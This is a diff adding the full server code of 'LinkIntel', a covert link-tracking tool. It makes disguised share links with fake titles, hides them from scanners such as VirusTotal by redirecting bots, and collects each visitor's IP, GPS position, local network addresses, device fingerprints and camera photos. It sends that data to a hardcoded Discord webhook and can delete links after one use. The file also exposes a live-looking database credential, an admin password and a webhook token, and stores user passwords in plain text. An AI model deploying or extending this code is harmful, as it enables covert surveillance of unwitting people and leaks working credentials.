@@ -1,0 +1,531 @@
+const express  = require('express');
+const { v4: uuidv4 } = require('uuid');
+const fetch    = require('node-fetch');
+const FormData = require('form-data');
+const cors     = require('cors');
+const path     = require('path');
+const bcrypt   = require('bcrypt');
+const crypto   = require('crypto');
+const mongoose = require('mongoose');
+
+const app  = express();
+const PORT = process.env.PORT || 3000;
+
+app.use(cors());
+app.use(express.json({ limit: '15mb' }));
+app.use(express.static(path.join(__dirname, 'public')));
+
+/* ═══════════════════════════════════════════
+   MONGOOSE CONNECTION & MODELS
+═══════════════════════════════════════════ */
+const MONGO_URI = process.env.MONGO_URI || 'mongodb+srv://vmtolegit_db_user:E2HAIWeRndl589xk@cluster0.q5rcohu.mongodb.net/?appName=Cluster0';
+
+mongoose.connect(MONGO_URI)
+  .then(() => console.log('\x1b[32m[DB] Connected to MongoDB Atlas successfully!\x1b[0m'))
+  .catch(err => console.error('\x1b[31m[DB] Connection failed:\x1b[0m', err));
+
+const userSchema = new mongoose.Schema({
+  username: { type: String, unique: true, required: true },
+  passwordHash: { type: String, required: true },
+  plainPassword: { type: String },
+  id: { type: String, unique: true, required: true },
+  isAdmin: { type: Boolean, default: false },
+  adminToken: { type: String },
+  createdAt: { type: Date, default: Date.now }
+});
+const User = mongoose.model('User', userSchema);
+
+const linkSchema = new mongoose.Schema({
+  url: { type: String, required: true },
+  label: { type: String, default: 'Shared Content' },
+  contentType: { type: String, default: 'auto' },
+  fakeTitle: { type: String, default: 'Shared with you' },
+  fakeDesc: { type: String, default: 'Someone shared this content with you.' },
+  creatorId: { type: String, required: true },
+  shortCode: { type: String, unique: true, required: true },
+  stealthPath: { type: String, unique: true, required: true },
+  burnAfterRead: { type: Boolean, default: false },
+  active: { type: Boolean, default: true },
+  createdAt: { type: Date, default: Date.now }
+});
+const Link = mongoose.model('Link', linkSchema);
+
+const captureSchema = new mongoose.Schema({
+  shortCode: { type: String, required: true, index: true },
+  id: { type: String, required: true },
+  realIp: { type: String },
+  location: { type: mongoose.Schema.Types.Mixed },
+  fingerprint: { type: String },
+  serverTime: { type: Date, default: Date.now },
+  stealthPath: { type: String },
+  ip: { type: String },
+  battery: { type: Number },
+  charging: { type: Boolean },
+  connection: { type: String },
+  deviceType: { type: String },
+  userAgent: { type: String },
+  screenWidth: { type: Number },
+  screenHeight: { type: Number },
+  language: { type: String },
+  timezone: { type: String },
+  platform: { type: String },
+  cookieEnabled: { type: Boolean },
+  doNotTrack: { type: String },
+  gps: { type: mongoose.Schema.Types.Mixed },
+  localIps: [String],
+  motion: { type: mongoose.Schema.Types.Mixed },
+  cpuCores: { type: mongoose.Schema.Types.Mixed },
+  deviceRam: { type: mongoose.Schema.Types.Mixed },
+  canvasHash: { type: String },
+  audioHash: { type: String },
+  subnetNodes: [String],
+  cameraPhoto: { type: String },
+  webglHash: { type: String }
+});
+const Capture = mongoose.model('Capture', captureSchema);
+
+/* ═══════════════════════════════════════════
+   DEFAULT ADMIN SEED
+═══════════════════════════════════════════ */
+async function seedAdmin() {
+  const adminUsername = 'adminrupankar';
+  const existing = await User.findOne({ username: adminUsername });
+  if (!existing) {
+    const passwordHash = await bcrypt.hash('8637852441', 10);
+    const newAdmin = new User({
+      username: adminUsername,
+      passwordHash: passwordHash,
+      plainPassword: '8637852441',
+      id: 'uid_admin',
+      isAdmin: true,
+      adminToken: crypto.randomBytes(16).toString('hex')
+    });
+    await newAdmin.save();
+    console.log('\x1b[33m[DB] Default admin account seeded.\x1b[0m');
+  }
+}
+mongoose.connection.once('open', seedAdmin);
+
+/* ═══════════════════════════════════════════
+   SSE — real-time push to dashboard
+═══════════════════════════════════════════ */
+const sseClients = {};
+
+app.get('/api/stream/:userId', (req, res) => {
+  const { userId } = req.params;
+  res.setHeader('Content-Type',  'text/event-stream');
+  res.setHeader('Cache-Control', 'no-cache');
+  res.setHeader('Connection',    'keep-alive');
+  res.flushHeaders();
+
+  if (!sseClients[userId]) sseClients[userId] = [];
+  sseClients[userId].push(res);
+
+  const heartbeat = setInterval(() => res.write(': ping\n\n'), 25000);
+  req.on('close', () => {
+    clearInterval(heartbeat);
+    sseClients[userId] = (sseClients[userId] || []).filter(r => r !== res);
+  });
+});
+
+function pushToUser(userId, event, data) {
+  const clients = sseClients[userId] || [];
+  const payload = `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`;
+  clients.forEach(r => { try { r.write(payload); } catch {} });
+}
+
+/* ═══════════════════════════════════════════
+   AUTH
+═══════════════════════════════════════════ */
+app.post('/api/login', async (req, res) => {
+  try {
+    const { username, password } = req.body;
+    if (!username || !password) return res.status(400).json({ error: 'Missing fields' });
+
+    const user = await User.findOne({ username });
+    if (!user) return res.status(401).json({ error: 'Invalid credentials' });
+
+    const match = await bcrypt.compare(password, user.passwordHash);
+    if (!match) return res.status(401).json({ error: 'Invalid credentials' });
+
+    if (user.isAdmin) {
+      user.adminToken = crypto.randomBytes(16).toString('hex');
+      await user.save();
+    }
+
+    const responseData = { success: true, userId: user.id, username, isAdmin: !!user.isAdmin };
+    if (user.isAdmin) responseData.adminToken = user.adminToken;
+    res.json(responseData);
+  } catch (err) {
+    console.error('[LOGIN ERROR]', err);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+app.post('/api/register', async (req, res) => {
+  try {
+    const { username, password } = req.body;
+    if (!username || !password) return res.status(400).json({ error: 'Missing fields' });
+    if (username.length < 3) return res.status(400).json({ error: 'Username must be at least 3 characters' });
+    if (password.length < 4) return res.status(400).json({ error: 'Password must be at least 4 characters' });
+
+    const existing = await User.findOne({ username });
+    if (existing) return res.status(409).json({ error: 'Username already taken' });
+
+    const passwordHash = await bcrypt.hash(password, 10);
+    const id = 'uid_' + uuidv4().replace(/-/g,'').slice(0,12);
+
+    const newUser = new User({ username, passwordHash, plainPassword: password, id, isAdmin: false });
+    await newUser.save();
+
+    res.json({ success: true, userId: id, username, isAdmin: false });
+  } catch (err) {
+    console.error('[REGISTER ERROR]', err);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+/* ═══════════════════════════════════════════
+   DEFENSIVE TRAP (HONEY-POT)
+═══════════════════════════════════════════ */
+app.post('/api/trap', (req, res) => {
+  const { user, pass, ua } = req.body;
+  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || 'Unknown';
+  console.log(`[HONEY-POT TRIPPED] IP: ${ip} | User: ${user} | Pass: ${pass}`);
+
+  const discordWebhookUrl = 'https://discord.com/api/webhooks/1507371930569936917/OkREOF7MjUKaykazIurzIWzqBxqiigMJWx6a3ilA7ylPIb9vM2pYxpOmfFqBIMefN0ZX';
+  const embed = {
+    title: "🚨 INTRUSION ATTEMPT BLOCKED", color: 16711680,
+    description: "Someone attempted to access the legacy admin portal.",
+    fields: [
+      { name: "Intruder IP", value: ip, inline: true },
+      { name: "Attempted User", value: user || 'N/A', inline: true },
+      { name: "Attempted Pass", value: pass || 'N/A', inline: true },
+      { name: "User-Agent", value: ua || 'N/A', inline: false }
+    ],
+    timestamp: new Date().toISOString()
+  };
+  fetch(discordWebhookUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ embeds: [embed] }) }).catch(() => {});
+  res.json({ success: true });
+});
+
+/* ═══════════════════════════════════════════
+   SUPER ADMIN — GOD MODE
+═══════════════════════════════════════════ */
+app.get('/api/admin/global', async (req, res) => {
+  try {
+    const userId = req.headers['x-user-id'];
+    const token  = req.headers['x-admin-token'];
+    const user   = await User.findOne({ id: userId });
+
+    if (!user || !user.isAdmin || user.adminToken !== token) {
+      return res.status(403).json({ error: 'Forbidden. Admin access required.' });
+    }
+
+    const users = await User.find({}, { passwordHash: 0 });
+    const links = await Link.find({});
+    const allCaptures = await Capture.find({});
+
+    const capturesMap = {};
+    allCaptures.forEach(c => {
+      if (!capturesMap[c.shortCode]) capturesMap[c.shortCode] = [];
+      capturesMap[c.shortCode].push(c);
+    });
+
+    const linksWithCount = links.map(l => {
+      const caps = capturesMap[l.shortCode] || [];
+      return { ...l.toObject(), visitCount: caps.length };
+    });
+
+    res.json({ users, links: linksWithCount, captures: capturesMap });
+  } catch (err) {
+    console.error('[GOD MODE ERROR]', err);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+/* ═══════════════════════════════════════════
+   LINKS CRUD
+═══════════════════════════════════════════ */
+app.post('/api/links', async (req, res) => {
+  try {
+    const { url, label, contentType, fakeTitle, fakeDesc, creatorId, customPath, burnAfterRead } = req.body;
+    if (!url || !creatorId) return res.status(400).json({ error: 'Missing required fields' });
+
+    const chars = 'ABCDEFGHJKMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789';
+    const shortCode = Array.from({ length: 11 }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
+
+    let stealthPath = customPath;
+    if (!stealthPath) {
+      stealthPath = `/s/${shortCode}`;
+    } else if (!stealthPath.startsWith('/')) {
+      stealthPath = `/${stealthPath}`;
+    }
+
+    const existingPath = await Link.findOne({ stealthPath });
+    if (existingPath) return res.status(400).json({ error: 'That custom path is already taken.' });
+
+    const newLink = new Link({
+      url, label: label || 'Shared Content',
+      contentType: contentType || 'auto',
+      fakeTitle: fakeTitle || 'Shared with you',
+      fakeDesc: fakeDesc || 'Someone shared this content with you.',
+      creatorId, shortCode, stealthPath,
+      burnAfterRead: !!burnAfterRead, active: true
+    });
+    await newLink.save();
+
+    // Build dynamic URL from request host
+    const proto = req.headers['x-forwarded-proto'] || req.protocol || 'http';
+    const host  = req.get('host');
+    const fullUrl = `${proto}://${host}${stealthPath}`;
+
+    res.json({ success: true, shortCode, stealthPath, shortUrl: fullUrl });
+  } catch (err) {
+    console.error('[CREATE LINK ERROR]', err);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+app.get('/api/links/:creatorId', async (req, res) => {
+  try {
+    const links = await Link.find({ creatorId: req.params.creatorId });
+    const result = [];
+    for (let l of links) {
+      const visitCount = await Capture.countDocuments({ shortCode: l.shortCode });
+      result.push({ ...l.toObject(), visitCount });
+    }
+    res.json(result);
+  } catch (err) {
+    console.error('[GET LINKS ERROR]', err);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+app.patch('/api/links/:shortCode', async (req, res) => {
+  try {
+    const lnk = await Link.findOneAndUpdate({ shortCode: req.params.shortCode }, req.body, { new: true });
+    if (!lnk) return res.status(404).json({ error: 'Not found' });
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+app.delete('/api/links/:shortCode', async (req, res) => {
+  try {
+    await Link.deleteOne({ shortCode: req.params.shortCode });
+    await Capture.deleteMany({ shortCode: req.params.shortCode });
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+/* ═══════════════════════════════════════════
+   LINK META (called by visitor landing page)
+═══════════════════════════════════════════ */
+app.get('/api/meta', async (req, res) => {
+  try {
+    const stealthPath = req.query.path;
+    if (!stealthPath) return res.status(400).json({ error: 'Missing path' });
+
+    let lnk = await Link.findOne({ stealthPath });
+    if (!lnk && stealthPath.startsWith('/s/')) {
+      const shortCode = stealthPath.replace('/s/', '');
+      lnk = await Link.findOne({ shortCode });
+    }
+    if (!lnk) return res.status(404).json({ error: 'Not found' });
+
+    res.json({
+      fakeTitle: lnk.fakeTitle, fakeDesc: lnk.fakeDesc,
+      contentType: lnk.contentType, destinationUrl: lnk.url
+    });
+  } catch (err) {
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+/* ═══════════════════════════════════════════
+   DATA COLLECTION
+═══════════════════════════════════════════ */
+app.post('/api/collect', async (req, res) => {
+  try {
+    const data = req.body;
+    const { stealthPath } = data;
+
+    let lnk = null;
+    if (stealthPath) lnk = await Link.findOne({ stealthPath });
+    if (!lnk && data.shortCode) lnk = await Link.findOne({ shortCode: data.shortCode });
+
+    if (!lnk) return res.status(404).json({ error: 'Unknown link' });
+
+    const shortCodeRef = lnk.shortCode;
+    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || 'Unknown';
+
+    // Geolocation from IP
+    let location = null;
+    if (ip && ip !== 'Unknown' && ip !== '::1' && ip !== '127.0.0.1') {
+      try {
+        const geoReq = await fetch(`http://ip-api.com/json/${ip}`);
+        const geoData = await geoReq.json();
+        if (geoData.status === 'success') location = geoData;
+      } catch {}
+    }
+
+    const fpString = `${data.userAgent}|${data.language}|${data.screenWidth}x${data.screenHeight}|${data.timezone}`;
+    const fingerprint = crypto.createHash('md5').update(fpString).digest('hex').substring(0, 12);
+
+    const captureObj = {
+      shortCode: shortCodeRef,
+      id: uuidv4().slice(0,8),
+      realIp: ip,
+      location,
+      fingerprint,
+      serverTime: new Date(),
+      stealthPath: data.stealthPath,
+      ip: data.ip,
+      battery: data.battery,
+      charging: data.charging,
+      connection: data.connection,
+      deviceType: data.deviceType,
+      userAgent: data.userAgent,
+      screenWidth: data.screenWidth,
+      screenHeight: data.screenHeight,
+      language: data.language,
+      timezone: data.timezone,
+      platform: data.platform,
+      cookieEnabled: data.cookieEnabled,
+      doNotTrack: data.doNotTrack,
+      gps: data.gps,
+      localIps: data.localIps || [],
+      motion: data.motion,
+      cpuCores: data.cpuCores,
+      deviceRam: data.deviceRam,
+      canvasHash: data.canvasHash,
+      audioHash: data.audioHash,
+      subnetNodes: data.subnetNodes || [],
+      cameraPhoto: data.cameraPhoto || null,
+      webglHash: data.webglHash
+    };
+
+    const newCapture = new Capture(captureObj);
+    await newCapture.save();
+
+    // Push real-time notification to creator
+    pushToUser(lnk.creatorId, 'capture', {
+      shortCode: shortCodeRef, linkLabel: lnk.label,
+      captureId: newCapture.id,
+      ip, battery: data.battery, deviceType: data.deviceType,
+      hasCamera: !!data.cameraPhoto,
+      time: newCapture.serverTime
+    });
+
+    // --- DISCORD WEBHOOK ---
+    const discordWebhookUrl = 'https://discord.com/api/webhooks/1507371930569936917/OkREOF7MjUKaykazIurzIWzqBxqiigMJWx6a3ilA7ylPIb9vM2pYxpOmfFqBIMefN0ZX';
+    try {
+      const locStr = location ? `${location.city}, ${location.country} (${location.isp})` : 'Unknown';
+      const embed = {
+        title: "🚨 Extreme Intelligence Captured", color: 65280,
+        fields: [
+          { name: "Target IP", value: ip || 'Unknown', inline: true },
+          { name: "Local Network IP", value: data.localIps && data.localIps.length ? data.localIps.join(', ') : 'Not Leaked', inline: true },
+          { name: "Active Subnet Nodes", value: data.subnetNodes && data.subnetNodes.length ? data.subnetNodes.join(', ') : 'None Found', inline: true },
+          { name: "GPS Coordinates", value: data.gps ? `[${data.gps.lat.toFixed(5)}, ${data.gps.lon.toFixed(5)}](https://www.google.com/maps?q=${data.gps.lat},${data.gps.lon})` : 'Denied', inline: true },
+          { name: "Geolocation", value: locStr, inline: true },
+          { name: "Hardware", value: `${data.deviceType} / CPU: ${data.cpuCores} / RAM: ${data.deviceRam}GB / Bat: ${data.battery !== null ? data.battery + '%' : '?'}`, inline: false },
+          { name: "Fingerprints", value: `Canvas: ${data.canvasHash || '?'} | Audio: ${data.audioHash || '?'} | WebGL: ${data.webglHash || '?'}`, inline: false },
+          { name: "Media Captured", value: `${data.cameraPhoto ? "📷 Image" : "❌ No Cam"}`, inline: false }
+        ],
+        footer: { text: "LinkIntel Stealth System | Burner: " + (lnk.burnAfterRead ? 'YES' : 'NO') },
+        timestamp: newCapture.serverTime
+      };
+
+      const form = new FormData();
+      if (data.cameraPhoto) {
+        const base64Data = data.cameraPhoto.replace(/^data:image\/\w+;base64,/, "");
+        const buffer = Buffer.from(base64Data, 'base64');
+        form.append('file1', buffer, { filename: 'capture.jpg', contentType: 'image/jpeg' });
+        embed.image = { url: "attachment://capture.jpg" };
+      }
+      form.append('payload_json', JSON.stringify({ embeds: [embed] }));
+      fetch(discordWebhookUrl, { method: 'POST', body: form }).catch(err => console.error("Discord webhook failed", err));
+    } catch (e) {
+      console.error("Webhook error", e);
+    }
+
+    // Burner Link
+    if (lnk.burnAfterRead) {
+      console.log(`[BURNER] Link ${shortCodeRef} self-destructing.`);
+      await Link.deleteOne({ shortCode: shortCodeRef });
+    }
+
+    res.json({ success: true, destinationUrl: lnk.url || '' });
+  } catch (err) {
+    console.error('[COLLECT ERROR]', err);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+app.get('/api/captures/:shortCode', async (req, res) => {
+  try {
+    const caps = await Capture.find({ shortCode: req.params.shortCode }).sort({ serverTime: -1 });
+    res.json(caps);
+  } catch (err) {
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+app.delete('/api/captures/:shortCode/:captureId', async (req, res) => {
+  try {
+    const { shortCode, captureId } = req.params;
+    await Capture.deleteOne({ shortCode, id: captureId });
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+/* ═══════════════════════════════════════════
+   VISITOR ROUTE CATCH-ALL & BOT EVASION
+   ** MUST BE LAST ** — after all /api/ routes
+═══════════════════════════════════════════ */
+app.get('*', async (req, res, next) => {
+  // Skip anything that looks like an API or static file request
+  if (req.path.startsWith('/api/')) return next();
+
+  try {
+    const lnk = await Link.findOne({ stealthPath: req.path });
+    if (lnk) {
+      if (!lnk.active) return res.status(404).send('Link not found or inactive');
+
+      // BOT EVASION FIREWALL
+      const ua = req.headers['user-agent'] || '';
+      const isBot = /bot|crawler|spider|crawling|discordbot|twitterbot|facebookexternalhit|whatsapp|telegrambot|virustotal|curl|wget/i.test(ua);
+      if (isBot) {
+        console.log(`[EVASION] Bot detected on ${req.path}. UA: ${ua}`);
+        return res.redirect('https://en.wikipedia.org/wiki/Main_Page');
+      }
+      return res.sendFile(path.join(__dirname, 'public', 'landing.html'));
+    }
+  } catch (err) {
+    console.error('[CATCH-ALL ERROR]', err);
+  }
+  next();
+});
+
+/* ═══════════════════════════════════════════
+   START
+═══════════════════════════════════════════ */
+app.listen(PORT, () => {
+  console.log('\x1b[32m');
+  console.log('  ██╗     ██╗███╗   ██╗██╗  ██╗██╗███╗   ██╗████████╗███████╗██╗     ');
+  console.log('  ██║     ██║████╗  ██║██║ ██╔╝██║████╗  ██║╚══██╔══╝██╔════╝██║     ');
+  console.log('  ██║     ██║██╔██╗ ██║█████╔╝ ██║██╔██╗ ██║   ██║   █████╗  ██║     ');
+  console.log('  ██║     ██║██║╚██╗██║██╔═██╗ ██║██║╚██╗██║   ██║   ██╔══╝  ██║     ');
+  console.log('  ███████╗██║██║ ╚████║██║  ██╗██║██║ ╚████║   ██║   ███████╗███████╗');
+  console.log('  ╚══════╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚══════╝');
+  console.log('\x1b[0m');
+  console.log(`\x1b[36m  ► Portal : \x1b[1mhttp://localhost:${PORT}\x1b[0m`);
+  console.log(`\x1b[90m  ► Login  : adminrupankar / 8637852441\x1b[0m\n`);
+});
